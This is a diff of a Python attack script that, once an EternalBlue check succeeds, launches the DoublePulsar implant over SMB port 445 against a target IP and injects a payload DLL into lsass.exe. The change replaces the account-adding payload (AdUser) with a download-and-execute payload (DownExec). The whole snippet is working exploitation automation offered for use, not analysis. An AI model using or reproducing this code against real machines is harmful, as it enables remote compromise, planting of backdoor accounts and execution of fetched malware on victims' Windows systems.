@@ -81,7 +81,7 @@ def main(remote_name):
         if eb_ok == 0:
             print(remote_name, ' OK ', arh, file=f)
             dp_ok = subprocess.call(
-                r'C:\Windows\System32\cmd.exe /c ' + path + '\\files\Doublepulsar-1.3.1.exe --InConfig ' + path + '\\files\Doublepulsar-1.3.1.xml --TargetIp ' + remote_name + ' --TargetPort 445 --OutConfig ' + path + '\\logs\DP_' + remote_name + '_445.txt --Protocol SMB --Architecture ' + arh + ' --Function RunDLL --DllPayload ' + path + '\\dlls\AdUser' + arh + '.dll --payloadDllOrdinal 1 --ProcessName lsass.exe --ProcessCommandLine "" --NetworkTimeout 60')
+                r'C:\Windows\System32\cmd.exe /c ' + path + '\\files\Doublepulsar-1.3.1.exe --InConfig ' + path + '\\files\Doublepulsar-1.3.1.xml --TargetIp ' + remote_name + ' --TargetPort 445 --OutConfig ' + path + '\\logs\DP_' + remote_name + '_445.txt --Protocol SMB --Architecture ' + arh + ' --Function RunDLL --DllPayload ' + path + '\\dlls\DownExec' + arh + '.dll --payloadDllOrdinal 1 --ProcessName lsass.exe --ProcessCommandLine "" --NetworkTimeout 60')
             if dp_ok == 0:
                 print(remote_name, 'AddUser OK ', file=f)
             else:
